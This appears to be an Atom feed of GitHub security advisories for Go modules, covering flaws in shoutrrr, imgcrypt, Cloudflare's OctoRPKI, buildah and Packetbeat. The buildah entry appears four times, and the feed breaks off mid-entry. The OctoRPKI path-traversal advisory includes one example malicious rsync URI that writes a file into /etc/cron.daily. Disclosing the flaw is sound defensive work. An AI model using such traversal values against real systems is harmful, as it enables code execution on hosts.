<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-02-14T19:01:18.580Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/containrrr/shoutrrr] Shoutrrr util package DoS via sending 2000, 4000, or 6000 character messages]]></title>
        <id>https://github.com/advisories/GHSA-477v-w82m-634j</id>
        <link href="https://github.com/advisories/GHSA-477v-w82m-634j"/>
        <updated>2023-02-14T18:56:55.000Z</updated>
        <content type="html"><![CDATA[<p>The package github.com/containrrr/shoutrrr/pkg/util before 0.6.0 are vulnerable to Denial of Service (DoS) via the util.PartitionMessage function. Exploiting this vulnerability is possible by sending exactly 2000, 4000, or 6000 characters messages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25891">https://nvd.nist.gov/vuln/detail/CVE-2022-25891</a></li>
<li><a href="https://github.com/containrrr/shoutrrr/issues/240">https://github.com/containrrr/shoutrrr/issues/240</a></li>
<li><a href="https://github.com/containrrr/shoutrrr/pull/242">https://github.com/containrrr/shoutrrr/pull/242</a></li>
<li><a href="https://github.com/containrrr/shoutrrr/commit/6a27056f9d7522a8b493216195cb7634bf4b5c42">https://github.com/containrrr/shoutrrr/commit/6a27056f9d7522a8b493216195cb7634bf4b5c42</a></li>
<li><a href="https://github.com/containrrr/shoutrrr/releases/tag/v0.6.0">https://github.com/containrrr/shoutrrr/releases/tag/v0.6.0</a></li>
<li><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINRRRSHOUTRRRPKGUTIL-2849059">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINRRRSHOUTRRRPKGUTIL-2849059</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0528">https://pkg.go.dev/vuln/GO-2022-0528</a></li>
<li><a href="https://github.com/advisories/GHSA-477v-w82m-634j">https://github.com/advisories/GHSA-477v-w82m-634j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-477v-w82m-634j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-16T00:00:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containerd/imgcrypt] Incorrect Authorization in imgcrypt]]></title>
        <id>https://github.com/advisories/GHSA-8v99-48m9-c8pm</id>
        <link href="https://github.com/advisories/GHSA-8v99-48m9-c8pm"/>
        <updated>2023-02-14T17:47:26.000Z</updated>
        <content type="html"><![CDATA[<p>Imgcrypt implements a function <code>CheckAuthorization()</code> that is supposed to check whether a user is authorized to access an encrypted image given the keys that the user has provided on the command line that would enable decryption of the image. The check is to prevent that a user can start a container from an image that has previously been decrypted by another user on the same system and therefore a decrypted version of the image layers may be already available in the cache locally.</p>
<p>The failure occurs when an image with a ManifestList is used and the architecture of the local host is not the first one in the ManifestList. In the version prior to the fix, only the first architecture in the list was tested, which may not have its layers available locally (were not pulled) since it cannot be run on the host architecture. Therefore, the verdict on unavailable layers was that the image could be run anticipating that image run failure would occur later due to the layers not being available. However, this verdict to allow the image to run lead to other architectures in the ManifestList be able to run an image without providing keys if that image had previously been decrypted. The fixed version now skips over irrelevant architectures and tests the Manifest of the local architecture, if available.</p>
<p>Known projects that use the <code>CheckAuthorization()</code> of imgcrypt is for example the ctr-enc client tool provided by imgcrypt. In this implementation, the call to <code>CheckAuthorization()</code> is used on the client side and could therefore also be easily circumvented by a modified client tool not calling this function.</p>
<p>In relation to the vulnerability in ctr-enc, affected environments would have to allow different users to invoke ctr-enc indirectly using some sort of management stack that gives user indirect access to ctr-enc.</p>
<p>The patch has been applied to imgcrypt v1.1.4. Workarounds may include usage of different namespaces for each remote user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containerd/imgcrypt/security/advisories/GHSA-8v99-48m9-c8pm">https://github.com/containerd/imgcrypt/security/advisories/GHSA-8v99-48m9-c8pm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24778">https://nvd.nist.gov/vuln/detail/CVE-2022-24778</a></li>
<li><a href="https://github.com/containerd/imgcrypt/issues/69">https://github.com/containerd/imgcrypt/issues/69</a></li>
<li><a href="https://github.com/containerd/imgcrypt/commit/6fdd9818a4d8142107b7ecd767d839c9707700d9">https://github.com/containerd/imgcrypt/commit/6fdd9818a4d8142107b7ecd767d839c9707700d9</a></li>
<li><a href="https://github.com/containerd/imgcrypt/releases/tag/v1.1.4">https://github.com/containerd/imgcrypt/releases/tag/v1.1.4</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TAHAAOOA3KZJC2I5WHCR3XVBJBNWTWUE/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TAHAAOOA3KZJC2I5WHCR3XVBJBNWTWUE/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZFTJR5CR5EOYDVOSBZEMLBHLJRTPJPUA/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZFTJR5CR5EOYDVOSBZEMLBHLJRTPJPUA/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4SJUNSC7YZLA745EMKWK2GKEV57GE52K/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4SJUNSC7YZLA745EMKWK2GKEV57GE52K/</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0412">https://pkg.go.dev/vuln/GO-2021-0412</a></li>
<li><a href="https://github.com/advisories/GHSA-8v99-48m9-c8pm">https://github.com/advisories/GHSA-8v99-48m9-c8pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8v99-48m9-c8pm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-03-28T19:33:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] OctoRPKI crashes when processing GZIP bomb returned via malicious repository]]></title>
        <id>https://github.com/advisories/GHSA-g9wh-3vrx-r7hg</id>
        <link href="https://github.com/advisories/GHSA-g9wh-3vrx-r7hg"/>
        <updated>2023-02-14T17:47:01.000Z</updated>
        <content type="html"><![CDATA[<p>OctoRPKI tries to load the entire contents of a repository in memory, and in the case of a GZIP bomb, unzip it in memory, making it possible to create a repository that makes OctoRPKI run out of memory (and thus crash). </p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-g9wh-3vrx-r7hg">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-g9wh-3vrx-r7hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3912">https://nvd.nist.gov/vuln/detail/CVE-2021-3912</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/648658b1b176a747b52645989cfddc73a81eacad">https://github.com/cloudflare/cfrpki/commit/648658b1b176a747b52645989cfddc73a81eacad</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0253">https://pkg.go.dev/vuln/GO-2022-0253</a></li>
<li><a href="https://github.com/advisories/GHSA-g9wh-3vrx-r7hg">https://github.com/advisories/GHSA-g9wh-3vrx-r7hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9wh-3vrx-r7hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-10T20:39:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] Misconfigured IP address field in ROA leads to OctoRPKI crash]]></title>
        <id>https://github.com/advisories/GHSA-w6ww-fmfx-2x22</id>
        <link href="https://github.com/advisories/GHSA-w6ww-fmfx-2x22"/>
        <updated>2023-02-14T17:46:32.000Z</updated>
        <content type="html"><![CDATA[<p>If the ROA that a repository returns contains too many bits for the IP address then OctoRPKI will crash.</p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-w6ww-fmfx-2x22">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-w6ww-fmfx-2x22</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3911">https://nvd.nist.gov/vuln/detail/CVE-2021-3911</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/2882307febd66801de97b2a2ce4d93fe58132005">https://github.com/cloudflare/cfrpki/commit/2882307febd66801de97b2a2ce4d93fe58132005</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0252">https://pkg.go.dev/vuln/GO-2022-0252</a></li>
<li><a href="https://github.com/advisories/GHSA-w6ww-fmfx-2x22">https://github.com/advisories/GHSA-w6ww-fmfx-2x22</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w6ww-fmfx-2x22</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-10T19:56:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] Arbitrary filepath traversal via URI injection ]]></title>
        <id>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</id>
        <link href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh"/>
        <updated>2023-02-14T17:46:08.000Z</updated>
        <content type="html"><![CDATA[<p>OctoRPKI does not escape a URI with a filename containing "..", this allows a repository to create a file, (ex.  <code>rsync://example.org/repo/../../etc/cron.daily/evil.roa</code>), which would then be written to disk outside the base cache folder. This could allow for remote code execution on the host machine OctoRPKI is running on. </p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3907">https://nvd.nist.gov/vuln/detail/CVE-2021-3907</a></li>
<li><a href="https://www.debian.org/security/2021/dsa-5033">https://www.debian.org/security/2021/dsa-5033</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284">https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0248">https://pkg.go.dev/vuln/GO-2022-0248</a></li>
<li><a href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-11-10T20:08:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] NUL character in ROA causes OctoRPKI to crash]]></title>
        <id>https://github.com/advisories/GHSA-5mxh-2qfv-4g7j</id>
        <link href="https://github.com/advisories/GHSA-5mxh-2qfv-4g7j"/>
        <updated>2023-02-14T17:45:40.000Z</updated>
        <content type="html"><![CDATA[<p>OctoRPKI crashes when encountering a repository that returns an invalid ROA (just an encoded <code>NUL</code> (<code>\0</code>) character).</p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-5mxh-2qfv-4g7j">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-5mxh-2qfv-4g7j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3910">https://nvd.nist.gov/vuln/detail/CVE-2021-3910</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/releases/tag/v1.4.0">https://github.com/cloudflare/cfrpki/releases/tag/v1.4.0</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/76f0f7a98da001fa04e5bc0407c6702f91096bfa">https://github.com/cloudflare/cfrpki/commit/76f0f7a98da001fa04e5bc0407c6702f91096bfa</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0251">https://pkg.go.dev/vuln/GO-2022-0251</a></li>
<li><a href="https://github.com/advisories/GHSA-5mxh-2qfv-4g7j">https://github.com/advisories/GHSA-5mxh-2qfv-4g7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5mxh-2qfv-4g7j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-11-10T20:15:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] OctoRPKI lacks contextual out-of-bounds check when validating RPKI ROA maxLength values]]></title>
        <id>https://github.com/advisories/GHSA-c8xp-8mf3-62h9</id>
        <link href="https://github.com/advisories/GHSA-c8xp-8mf3-62h9"/>
        <updated>2023-02-14T17:45:21.000Z</updated>
        <content type="html"><![CDATA[<p>Any CA issuer in the RPKI can trick OctoRPKI prior to <a href="https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422">https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422</a> into emitting an invalid VRP "MaxLength" value, causing RTR sessions to terminate. </p>
<h3 id="impact">Impact</h3>
<p>An attacker can use this to disable RPKI Origin Validation in a victim network (for example AS 13335 - Cloudflare) prior to launching a BGP hijack which during normal operations would be rejected as "RPKI invalid". Additionally, in certain deployments RTR session flapping in and of itself also could cause BGP routing churn, causing availability issues.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422">https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422</a></p>
<p><a href="https://github.com/cloudflare/cfrpki/releases/tag/v1.3.0">https://github.com/cloudflare/cfrpki/releases/tag/v1.3.0</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="security@cloudflare.com">security@cloudflare.com</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-c8xp-8mf3-62h9">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-c8xp-8mf3-62h9</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422">https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/releases/tag/v1.3.0">https://github.com/cloudflare/cfrpki/releases/tag/v1.3.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3761">https://nvd.nist.gov/vuln/detail/CVE-2021-3761</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/pull/90">https://github.com/cloudflare/cfrpki/pull/90</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0246">https://pkg.go.dev/vuln/GO-2022-0246</a></li>
<li><a href="https://github.com/advisories/GHSA-c8xp-8mf3-62h9">https://github.com/advisories/GHSA-c8xp-8mf3-62h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8xp-8mf3-62h9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-09-07T23:02:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] chroot isolation: environment value leakage to intermediate processes]]></title>
        <id>https://github.com/advisories/GHSA-7638-r9r3-rmjj</id>
        <link href="https://github.com/advisories/GHSA-7638-r9r3-rmjj"/>
        <updated>2023-02-14T17:44:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When running processes using "chroot" isolation, the process being run can examine the environment variables of its immediate parent and grandparent processes (CVE-2021-3602).  This isolation type is often used when running <code>buildah</code> in unprivileged containers, and it is often used to do so in CI/CD environments.  If sensitive information is exposed to the original <code>buildah</code> process through its environment, that information will unintentionally be shared with child processes which it starts as part of handling RUN instructions or during <code>buildah run</code>.  The commands that <code>buildah</code> is instructed to run can read that information if they choose to.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade packages, or images which contain packages, to include version 1.21.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As a workaround, invoking <code>buildah</code> in a container under <code>env -i</code> to have it started with a reinitialized environment should prevent the leakage.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/containers/buildah/issues">buildah</a></li>
<li>Email us at <a href="mailto:buildah@lists.buildah.io">the buildah general mailing list</a>, or <a href="mailto:security@lists.podman.io">the podman security mailing list</a> if it's sensitive.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj">https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3602">https://nvd.nist.gov/vuln/detail/CVE-2021-3602</a></li>
<li><a href="https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0">https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1969264">https://bugzilla.redhat.com/show_bug.cgi?id=1969264</a></li>
<li><a href="https://ubuntu.com/security/CVE-2021-3602">https://ubuntu.com/security/CVE-2021-3602</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0345">https://pkg.go.dev/vuln/GO-2022-0345</a></li>
<li><a href="https://github.com/advisories/GHSA-7638-r9r3-rmjj">https://github.com/advisories/GHSA-7638-r9r3-rmjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7638-r9r3-rmjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-07-19T15:19:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] chroot isolation: environment value leakage to intermediate processes]]></title>
        <id>https://github.com/advisories/GHSA-7638-r9r3-rmjj</id>
        <link href="https://github.com/advisories/GHSA-7638-r9r3-rmjj"/>
        <updated>2023-02-14T17:44:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When running processes using "chroot" isolation, the process being run can examine the environment variables of its immediate parent and grandparent processes (CVE-2021-3602).  This isolation type is often used when running <code>buildah</code> in unprivileged containers, and it is often used to do so in CI/CD environments.  If sensitive information is exposed to the original <code>buildah</code> process through its environment, that information will unintentionally be shared with child processes which it starts as part of handling RUN instructions or during <code>buildah run</code>.  The commands that <code>buildah</code> is instructed to run can read that information if they choose to.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade packages, or images which contain packages, to include version 1.21.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As a workaround, invoking <code>buildah</code> in a container under <code>env -i</code> to have it started with a reinitialized environment should prevent the leakage.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/containers/buildah/issues">buildah</a></li>
<li>Email us at <a href="mailto:buildah@lists.buildah.io">the buildah general mailing list</a>, or <a href="mailto:security@lists.podman.io">the podman security mailing list</a> if it's sensitive.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj">https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3602">https://nvd.nist.gov/vuln/detail/CVE-2021-3602</a></li>
<li><a href="https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0">https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1969264">https://bugzilla.redhat.com/show_bug.cgi?id=1969264</a></li>
<li><a href="https://ubuntu.com/security/CVE-2021-3602">https://ubuntu.com/security/CVE-2021-3602</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0345">https://pkg.go.dev/vuln/GO-2022-0345</a></li>
<li><a href="https://github.com/advisories/GHSA-7638-r9r3-rmjj">https://github.com/advisories/GHSA-7638-r9r3-rmjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7638-r9r3-rmjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-07-19T15:19:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] chroot isolation: environment value leakage to intermediate processes]]></title>
        <id>https://github.com/advisories/GHSA-7638-r9r3-rmjj</id>
        <link href="https://github.com/advisories/GHSA-7638-r9r3-rmjj"/>
        <updated>2023-02-14T17:44:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When running processes using "chroot" isolation, the process being run can examine the environment variables of its immediate parent and grandparent processes (CVE-2021-3602).  This isolation type is often used when running <code>buildah</code> in unprivileged containers, and it is often used to do so in CI/CD environments.  If sensitive information is exposed to the original <code>buildah</code> process through its environment, that information will unintentionally be shared with child processes which it starts as part of handling RUN instructions or during <code>buildah run</code>.  The commands that <code>buildah</code> is instructed to run can read that information if they choose to.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade packages, or images which contain packages, to include version 1.21.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As a workaround, invoking <code>buildah</code> in a container under <code>env -i</code> to have it started with a reinitialized environment should prevent the leakage.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/containers/buildah/issues">buildah</a></li>
<li>Email us at <a href="mailto:buildah@lists.buildah.io">the buildah general mailing list</a>, or <a href="mailto:security@lists.podman.io">the podman security mailing list</a> if it's sensitive.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj">https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3602">https://nvd.nist.gov/vuln/detail/CVE-2021-3602</a></li>
<li><a href="https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0">https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1969264">https://bugzilla.redhat.com/show_bug.cgi?id=1969264</a></li>
<li><a href="https://ubuntu.com/security/CVE-2021-3602">https://ubuntu.com/security/CVE-2021-3602</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0345">https://pkg.go.dev/vuln/GO-2022-0345</a></li>
<li><a href="https://github.com/advisories/GHSA-7638-r9r3-rmjj">https://github.com/advisories/GHSA-7638-r9r3-rmjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7638-r9r3-rmjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-07-19T15:19:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] chroot isolation: environment value leakage to intermediate processes]]></title>
        <id>https://github.com/advisories/GHSA-7638-r9r3-rmjj</id>
        <link href="https://github.com/advisories/GHSA-7638-r9r3-rmjj"/>
        <updated>2023-02-14T17:44:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When running processes using "chroot" isolation, the process being run can examine the environment variables of its immediate parent and grandparent processes (CVE-2021-3602).  This isolation type is often used when running <code>buildah</code> in unprivileged containers, and it is often used to do so in CI/CD environments.  If sensitive information is exposed to the original <code>buildah</code> process through its environment, that information will unintentionally be shared with child processes which it starts as part of handling RUN instructions or during <code>buildah run</code>.  The commands that <code>buildah</code> is instructed to run can read that information if they choose to.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade packages, or images which contain packages, to include version 1.21.3 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As a workaround, invoking <code>buildah</code> in a container under <code>env -i</code> to have it started with a reinitialized environment should prevent the leakage.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/containers/buildah/issues">buildah</a></li>
<li>Email us at <a href="mailto:buildah@lists.buildah.io">the buildah general mailing list</a>, or <a href="mailto:security@lists.podman.io">the podman security mailing list</a> if it's sensitive.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj">https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3602">https://nvd.nist.gov/vuln/detail/CVE-2021-3602</a></li>
<li><a href="https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0">https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1969264">https://bugzilla.redhat.com/show_bug.cgi?id=1969264</a></li>
<li><a href="https://ubuntu.com/security/CVE-2021-3602">https://ubuntu.com/security/CVE-2021-3602</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0345">https://pkg.go.dev/vuln/GO-2022-0345</a></li>
<li><a href="https://github.com/advisories/GHSA-7638-r9r3-rmjj">https://github.com/advisories/GHSA-7638-r9r3-rmjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7638-r9r3-rmjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-07-19T15:19:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/elastic/beats] Denial of Service in Packetbeat]]></title>
        <id>https://github.com/advisories/GHSA-9q3g-m353-cp4p</id>
        <link href="https://github.com/advisories/GHSA-9q3g-m353-cp4p"/>
        <updated>2023-02-14T17:43:39.000Z</updated>
        <content type="html"><![CDATA[<p>Packetbeat versions prior to 5.6.4 and 6.0.0 are affected by a denial of service flaw in the PostgreSQL protocol handler. If Packetbeat is listening for PostgreSQL traffic and a user is able to send arbitrary network traffic to the monitored port, the attacker could prevent Packetbeat from properly logging other PostgreSQL traffic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11480">https://nvd.nist.gov/vuln/detail/CVE-2017-11480</a></li>
<li><a href="https://github.com/elastic/beats/pull/5457">https://github.com/elastic/beats/pull/5457</a></li>
<li><a href="https://discuss.elastic.co/t/beats-5-6-4-security-update/106739">https://discuss.elastic.co/t/beats-5-6-4-security-update/106739</a></li>
<li><a href="https://github.com/elastic/beats/pull/5479">https://github.com/elastic/beats/pull/5479</a></li>
<li><a href="https://github.com/elastic/beats/pull/5480">https://github.com/elastic/beats/pull/5480</a></li>
<li><a href="https://github.com/elastic/beats/commit/aeca65779d573976981587ca1d1461399e1b59dd">https://github.com/elastic/beats/commit/aeca65779d573976981587ca1d1461399e1b59dd</a></li>
